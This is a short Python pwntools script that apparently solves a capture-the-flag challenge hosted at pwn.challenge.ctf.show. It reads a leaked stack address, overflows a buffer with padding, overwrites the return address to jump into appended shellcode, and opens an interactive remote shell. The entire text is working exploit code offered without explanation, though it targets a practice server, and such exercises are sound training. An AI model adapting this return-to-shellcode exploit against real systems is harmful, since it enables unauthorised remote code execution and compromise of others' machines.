from pwn import *
context(arch='amd64', os='linux')

#p = process('./pwn')
p = remote('pwn.challenge.ctf.show', 28295)

shellcode = asm(shellcraft.sh())

p.recvuntil(b"[")
v5 = p.recvuntil(b']', drop=True)
v5 = int(v5, 16)
print(hex(v5))

p.recvuntil(b"Maybe it's useful ! But how to use it?")
payload = b'A' * (0x10+8) + p64(v5+0x20) + shellcode
p.sendline(payload)

p.interactive()